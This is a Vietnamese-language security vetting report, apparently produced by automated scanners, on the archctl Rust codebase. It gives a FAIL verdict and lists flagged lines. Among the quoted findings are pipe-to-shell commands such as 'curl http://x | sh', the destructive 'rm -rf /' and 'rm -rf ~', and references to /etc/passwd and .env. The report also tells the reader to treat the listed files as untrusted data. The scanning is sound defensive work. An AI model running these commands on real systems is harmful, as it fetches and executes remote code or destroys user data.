# Kiểm duyệt: local:/private/tmp/claude-501/-Users-macos-Documents-Claude-agent-stack/e9e35547-062c-4a20-ae9b-a71b80afd397/scratchpad/vet-archctl-7f06586/archctl

- Ngày: 2026-11-15 · Công cụ: vet.py/1 + SkillSpector 2.12.0
- Nguồn: local:/private/tmp/claude-501/-Users-macos-Documents-Claude-agent-stack/e9e35547-062c-4a20-ae9b-a71b80afd397/scratchpad/vet-archctl-7f06586/archctl · Commit: `c2527dd5c8afeccc711332470ee5a7e57bf576af0c3362bc436e2c2b8d2bf186`
- **Phán quyết: FAIL**

File giấy phép: LICENSE: Apache-2.0

## Thống kê file

code: 160, md: 21, other: 85 · tổng 3560 KB

## Lý do

- ❌ [rce-pipe] Tải script từ mạng rồi chạy thẳng bằng shell. (×2, ví dụ crates/arch-core/src/discover.rs:1390)
- ⚠️ [rce-pipe] Tải script từ mạng rồi chạy thẳng bằng shell. (trong tài liệu, có thể chỉ là ví dụ) (×2, ví dụ docs/verify.md:99)
- ⚠️ [rce-pipe] Tải script từ mạng rồi chạy thẳng bằng shell. (.github/workflows/ci.yml:68)
- ⚠️ [SkillSpector TM4] hostNetwork: True (high) (×4, ví dụ .agent/NHAT-KY.md:21)
- ⚠️ [SkillSpector PE3] /etc/passwd (high) (×5, ví dụ .agent/threat-model.md:99)
- ⚠️ [SkillSpector SC2] curl ... | sh (high) (×2, ví dụ .github/workflows/ci.yml:68)
- ⚠️ [SkillSpector RA1] self-update (high) (.github/workflows/ci.yml:139)
- ⚠️ [SkillSpector TM2] | sudo (high) (.github/workflows/release.yml:86)
- ⚠️ [SkillSpector E2] {**os.environ, "GIT_LFS_SKIP_SMUDGE": "1", "GIT_TERMINAL_PROMPT": "0"} (high) (bench/bench.py:41)
- ⚠️ [SkillSpector E2] {**os.environ, "GO111MODULE": "off", "GOFLAGS": ""} (high) (×3, ví dụ bench/code_hosts.py:752)
- ⚠️ [SkillSpector PE3] .env (high) (×8, ví dụ bench/deploy_truth.py:133)
- ⚠️ [SkillSpector TM4] hostNetwork: true (high) (×7, ví dụ bench/k8s_truth.py:168)
- ⚠️ [SkillSpector E2] {**os.environ, "CARGO_NET_OFFLINE": "false", "CARGO_TARGET_DIR": str(proj / "target")} (high) (bench/oracle.py:631)
- ⚠️ [SkillSpector TT1] subprocess.run([kustomize, "build", d or "."], cwd=root, capture_output=True, text=True, timeout=300, env={"PATH": os.e… (high) (bench/oracle.py:1108)
- ⚠️ [SkillSpector AST5] os.execv(real, [real, *args]) (high) (bench/sabotage.py:522)
- ⚠️ [SkillSpector E2] {**os.environ, "SABOTAGE": mode, "SABOTAGE_REAL": str(Path(args.archctl).resolve())} (high) (bench/sabotage.py:736)
- ⚠️ [SkillSpector SC2] curl -s x|sh (high) (crates/arch-core/src/discover.rs:1390)
- ⚠️ [SkillSpector PE3] .env" (high) (×2, ví dụ crates/arch-core/src/scan/compose.rs:698)
- ⚠️ [SkillSpector PE3] secret.env (high) (×6, ví dụ crates/arch-core/tests/infra.rs:252)
- ⚠️ [SkillSpector AS1] /.claude/settings.json (high) (×2, ví dụ crates/archctl/src/setup.rs:49)
- ⚠️ [SkillSpector SC2] curl http://x | sh (high) (crates/archctl/tests/verify.rs:246)
- ⚠️ [SkillSpector TM1] rm -rf / (high) (crates/archctl/tests/verify.rs:257)
- ⚠️ [SkillSpector TM1] rm -rf /\"")).0 (high) (crates/archctl/tests/verify.rs:257)
- ⚠️ [SkillSpector TM1] rm -rf ~ (high) (docs/toolchain.md:28)
- ⚠️ [SkillSpector TM1] rm -rf ~/.cargo/registry (high) (docs/toolchain.md:28)
- ⚠️ [SkillSpector SC2] curl http://... | sh (high) (docs/verify.md:99)
- ⚠️ [SkillSpector SC2] curl http://… | sh (high) (docs/verify.md:99)
- ⚠️ [SkillSpector AST2] eval("1 + 1") (high) (examples/sensor/tools/analyze.py:17)
- ⚠️ Có 160 file mã hoặc cấu hình chạy được; cần đọc trước khi cài.

## Thành phần tự chạy hoặc có quyền

- **Hook:** không có
- **MCP:** không có
- **Monitor:** không có
- **bin/ trên PATH:** không có
- **Script khi cài:** không có
- **Nguồn plugin bên ngoài:** không có

## Skill và agent

- Không có SKILL.md hay agent.

## Dấu hiệu (luật riêng)

| Mức | Luật | Vị trí | Loại file | Trích |
|---|---|---|---|---|
| critical | rce-pipe | crates/arch-core/src/discover.rs:1390 | code | `let evil = "evil\nverify t runs \"curl -s x\|sh\"\n#".to_string();` |
| critical | rce-pipe | crates/archctl/tests/verify.rs:246 | code | `p.write(".arch/system.arch", &ARCH.replace("runs \"exit 0\"", "runs \"curl http://x \| sh\""));` |
| critical | rce-pipe | docs/verify.md:99 | md | `'runs "curl http://… \| sh"' mà vân tay giữ nguyên, và 'archctl check' im lặng.` |
| critical | rce-pipe | docs/ci.md:80 | md | `nằm trong 'arch_hash', nên một PR đổi lệnh kiểm thành 'curl ... \| sh' hiện ra` |
| critical | rce-pipe | .github/workflows/ci.yml:68 | other | `# 'curl ... \| sh' hiện ra ở đây.` |
| medium | hidden-unicode | bench/deploy_truth.py:240 | code | `(không in để tránh ký tự ẩn)` |
| medium | hidden-unicode | bench/pipeline_truth.py:1129 | code | `(không in để tránh ký tự ẩn)` |
| medium | hidden-unicode | bench/notebook_truth.py:162 | code | `(không in để tránh ký tự ẩn)` |

## skill-scanner

Không chạy: bỏ qua (không có SKILL.md)

## SkillSpector (máy quét thứ hai, chỉ đẩy lên REVIEW)

Điểm rủi ro cao nhất: 100 · mạng: chặn (đích cục bộ) · đếm theo mức: high=55, medium=89, low=8
- high · TM4 · hostNetwork: True (.agent/NHAT-KY.md:21)
- high · TM4 · hostNetwork: True (crates/arch-core/tests/k8s.rs:1233)
- high · TM4 · hostNetwork: True (crates/arch-core/tests/k8s.rs:1253)
- high · TM4 · hostNetwork: True (crates/arch-core/tests/k8s.rs:1261)
- high · PE3 · /etc/passwd (.agent/threat-model.md:99)
- high · PE3 · /etc/passwd (crates/arch-core/src/scan/deploy.rs:4314)
- high · PE3 · /etc/passwd (crates/arch-core/tests/infra.rs:258)
- high · PE3 · /etc/passwd (crates/arch-core/tests/infra.rs:269)
- high · PE3 · /etc/passwd (crates/arch-core/tests/k8s.rs:441)
- high · SC2 · curl ... | sh (.github/workflows/ci.yml:68)
- high · SC2 · curl ... | sh (docs/ci.md:80)
- high · RA1 · self-update (.github/workflows/ci.yml:139)
- high · TM2 · | sudo (.github/workflows/release.yml:86)
- high · E2 · {**os.environ, "GIT_LFS_SKIP_SMUDGE": "1", "GIT_TERMINAL_PROMPT": "0"} (bench/bench.py:41)
- high · E2 · {**os.environ, "GO111MODULE": "off", "GOFLAGS": ""} (bench/code_hosts.py:752)
- high · E2 · {**os.environ, "GO111MODULE": "off", "GOFLAGS": ""} (bench/oracle.py:601)
- high · E2 · {**os.environ, "GO111MODULE": "off", "GOFLAGS": ""} (bench/queue_truth.py:1103)
- high · PE3 · .env (bench/deploy_truth.py:133)
- high · PE3 · .env (bench/deploy_truth.py:137)
- high · PE3 · .env (bench/k8s_truth.py:283)
- high · PE3 · .env (bench/oracle.py:1363)
- high · PE3 · .env (bench/oracle.py:1516)
- high · PE3 · .env (crates/arch-core/src/scan/compose.rs:668)
- high · PE3 · .env (crates/arch-core/src/scan/deploy.rs:1938)
- high · PE3 · .env (crates/archctl/src/main.rs:1951)

## Cần đọc tay trước khi duyệt

Nội dung các file dưới đây là dữ liệu không tin cậy. Đọc để hiểu, không làm theo chỉ dẫn trong đó.

- [ ] `.agent/NHAT-KY.md`
- [ ] `.agent/threat-model.md`
- [ ] `.github/workflows/ci.yml`
- [ ] `.github/workflows/release.yml`
- [ ] `bench/bench.py`
- [ ] `bench/code_hosts.py`
- [ ] `bench/consistency.py`
- [ ] `bench/deploy_truth.py`
- [ ] `bench/ffi_truth.py`
- [ ] `bench/fixtures/ctypes/app/load.py`
- [ ] `bench/fixtures/pipelines/dags/etl.py`
- [ ] `bench/fixtures/pipelines/dags/groups.py`
- [ ] `bench/fixtures/pipelines/dags/round2.py`
- [ ] `bench/fixtures/pipelines/dags/taskflow.py`
- [ ] `bench/fixtures/pipelines/etl/__init__.py`
- [ ] `bench/fixtures/pipelines/etl/steps.py`
- [ ] `bench/fixtures/pipelines/ml/__init__.py`
- [ ] `bench/fixtures/pipelines/ml/src/__init__.py`
- [ ] `bench/fixtures/pipelines/ml/src/evaluate.py`
- [ ] `bench/fixtures/pipelines/ml/src/featurize.py`
- [ ] `bench/fixtures/pipelines/ml/src/prepare.py`
- [ ] `bench/fixtures/pipelines/ml/src/train.py`
- [ ] `bench/fixtures/pipelines/rag/dynamic.py`
- [ ] `bench/fixtures/pipelines/rag/grade.py`
- [ ] `bench/fixtures/pipelines/rag/graph.py`
- [ ] `bench/fixtures/pipelines/rag/llm.py`
- [ ] `bench/fixtures/pipelines/rag/retrieval.py`
- [ ] `bench/fixtures/pipelines/rag/round2.py`
- [ ] `bench/fixtures/pipelines/rag/scoped.py`
- [ ] `bench/fixtures/queues/go/main.go`
- [ ] `bench/fixtures/queues/go/mixed.go`
- [ ] `bench/fixtures/queues/go/nats.go`
- [ ] `bench/fixtures/queues/py/kafka_redis.py`
- [ ] `bench/fixtures/queues/py/mixed.py`
- [ ] `bench/fixtures/queues/py/nats_aio_kombu.py`
- [ ] `bench/fixtures/queues/py/rabbit_celery.py`
- [ ] `bench/flows.py`
- [ ] `bench/java_truth.py`
- [ ] `bench/k8s_truth.py`
- [ ] `bench/notebook_truth.py`
- [ ] `bench/oracle.py`
- [ ] `bench/pipeline_truth.py`
- [ ] `bench/proto_truth.py`
- [ ] `bench/queue_truth.py`
- [ ] `bench/sabotage.py`
- [ ] `bench/tf_truth.py`
- [ ] `crates/arch-core/src/baseline.rs`
- [ ] `crates/arch-core/src/cbuild.rs`
- [ ] `crates/arch-core/src/check.rs`
- [ ] `crates/arch-core/src/diag.rs`
- [ ] `crates/arch-core/src/diff.rs`
- [ ] `crates/arch-core/src/discover.rs`
- [ ] `crates/arch-core/src/export.rs`
- [ ] `crates/arch-core/src/glob.rs`
- [ ] `crates/arch-core/src/json.rs`
- [ ] `crates/arch-core/src/jsonc.rs`
- [ ] `crates/arch-core/src/layout.rs`
- [ ] `crates/arch-core/src/lib.rs`
- [ ] `crates/arch-core/src/model.rs`
- [ ] `crates/arch-core/src/parser.rs`
- [ ] `crates/arch-core/src/protocol.rs`
- [ ] `crates/arch-core/src/resolve.rs`
- [ ] `crates/arch-core/src/scan/clang.rs`
- [ ] `crates/arch-core/src/scan/command.rs`
- [ ] `crates/arch-core/src/scan/compose.rs`
- [ ] `crates/arch-core/src/scan/deploy.rs`
- [ ] `crates/arch-core/src/scan/dockerfile.rs`
- [ ] `crates/arch-core/src/scan/foreign.rs`
- [ ] `crates/arch-core/src/scan/golang.rs`
- [ ] `crates/arch-core/src/scan/grpc.rs`
- [ ] `crates/arch-core/src/scan/hcl.rs`
- [ ] `crates/arch-core/src/scan/helm.rs`
- [ ] `crates/arch-core/src/scan/hosts.rs`
- [ ] `crates/arch-core/src/scan/java.rs`
- [ ] `crates/arch-core/src/scan/k8s.rs`
- [ ] `crates/arch-core/src/scan/kustomize.rs`
- [ ] `crates/arch-core/src/scan/lexer.rs`
- [ ] `crates/arch-core/src/scan/mod.rs`
- [ ] `crates/arch-core/src/scan/notebook.rs`
- [ ] `crates/arch-core/src/scan/pipeline.rs`
- [ ] `crates/arch-core/src/scan/python.rs`
- [ ] `crates/arch-core/src/scan/queue.rs`
- [ ] `crates/arch-core/src/scan/rustlang.rs`
- [ ] `crates/arch-core/src/scan/terraform.rs`
- [ ] `crates/arch-core/src/scan/tfplan.rs`
- [ ] `crates/arch-core/src/scan/ts.rs`
- [ ] `crates/arch-core/src/scan/yaml.rs`
- [ ] `crates/arch-core/src/testclock.rs`
- [ ] `crates/arch-core/src/validate.rs`
- [ ] `crates/arch-core/src/verify.rs`
- [ ] `crates/arch-core/tests/api.rs`
- [ ] `crates/arch-core/tests/cbuild.rs`
- [ ] `crates/arch-core/tests/check.rs`
- [ ] `crates/arch-core/tests/declare.rs`
- [ ] `crates/arch-core/tests/diff.rs`
- [ ] `crates/arch-core/tests/discover.rs`
- [ ] `crates/arch-core/tests/dogfood.rs`
- [ ] `crates/arch-core/tests/ffi.rs`
- [ ] `crates/arch-core/tests/glob.rs`
- [ ] `crates/arch-core/tests/grpc.rs`
- [ ] `crates/arch-core/tests/ignore.rs`
- [ ] `crates/arch-core/tests/infra.rs`
- [ ] `crates/arch-core/tests/java.rs`
- [ ] `crates/arch-core/tests/k8s.rs`
- [ ] `crates/arch-core/tests/layout.rs`
- [ ] `crates/arch-core/tests/limits.rs`
- [ ] `crates/arch-core/tests/ml.rs`
- [ ] `crates/arch-core/tests/notebook.rs`
- [ ] `crates/arch-core/tests/parse.rs`
- [ ] `crates/arch-core/tests/pipeline.rs`
- [ ] `crates/arch-core/tests/polyglot.rs`
- [ ] `crates/arch-core/tests/protocol.rs`
- [ ] `crates/arch-core/tests/queue.rs`
- [ ] `crates/arch-core/tests/resolve.rs`
- [ ] `crates/arch-core/tests/scan.rs`
- [ ] `crates/arch-core/tests/store.rs`
- [ ] `crates/arch-core/tests/terraform.rs`
- [ ] `crates/archctl/src/main.rs`
- [ ] `crates/archctl/src/proto.rs`
- [ ] `crates/archctl/src/serve.rs`
- [ ] `crates/archctl/src/setup.rs`
- [ ] `crates/archctl/tests/cli.rs`
- [ ] `crates/archctl/tests/hook.rs`
- [ ] `crates/archctl/tests/serve.rs`
- [ ] `crates/archctl/tests/verify.rs`
- [ ] `docs/ci.md`
- [ ] `docs/infra.md`
- [ ] `docs/toolchain.md`
- [ ] `docs/verify.md`
- [ ] `examples/ml/mlapp/__init__.py`
- [ ] `examples/ml/mlapp/data/__init__.py`
- [ ] `examples/ml/mlapp/data/loader.py`
- [ ] `examples/ml/mlapp/features/__init__.py`
- [ ] `examples/ml/mlapp/features/build.py`
- [ ] `examples/ml/mlapp/llm/__init__.py`
- [ ] `examples/ml/mlapp/llm/gateway.py`
- [ ] `examples/ml/mlapp/models/__init__.py`
- [ ] `examples/ml/mlapp/models/net.py`
- [ ] `examples/ml/mlapp/ops/__init__.py`
- [ ] `examples/ml/mlapp/rag/__init__.py`
- [ ] `examples/ml/mlapp/rag/graph.py`
- [ ] `examples/ml/mlapp/rag/retriever.py`
- [ ] `examples/ml/mlapp/serve/__init__.py`
- [ ] `examples/ml/mlapp/serve/api.py`
- [ ] `examples/ml/mlapp/train/__init__.py`
- [ ] `examples/ml/mlapp/train/loop.py`
- [ ] `examples/ml/mlapp/web/__init__.py`
- [ ] `examples/ml/mlapp/web/app.py`
- [ ] `examples/ml/mlapp/web/export.py`
- [ ] `examples/ml/tests/test_model_arch.py`
- [ ] `examples/sensor/cmd/sensorctl/main.go`
- [ ] `examples/sensor/internal/stream/stream.go`
- [ ] `examples/sensor/src/capture/mod.rs`
- [ ] `examples/sensor/src/decode/ethernet.rs`
- [ ] `examples/sensor/src/decode/mod.rs`
- [ ] `examples/sensor/src/main.rs`
- [ ] `examples/sensor/src/report.rs`
- [ ] `examples/sensor/tools/__init__.py`
- [ ] `examples/sensor/tools/analyze.py`
- [ ] `examples/sensor/tools/lib/__init__.py`
- [ ] `examples/sensor/tools/lib/io.py`
- [ ] `examples/shop/src/notify/send.ts`
- [ ] `examples/shop/src/order/create-order.ts`
- [ ] `examples/shop/src/payment/charge.ts`
- [ ] `examples/shop/src/shared/money.ts`
- [ ] `examples/shop/src/stock/reserve.ts`
- [ ] `examples/shop/src/user/profile.ts`
- [ ] `examples/shop/src/web/checkout-page.ts`

Duyệt xong thì ghi lại: `vet.py approve <khóa> --note "..."` (hoặc `reject`).
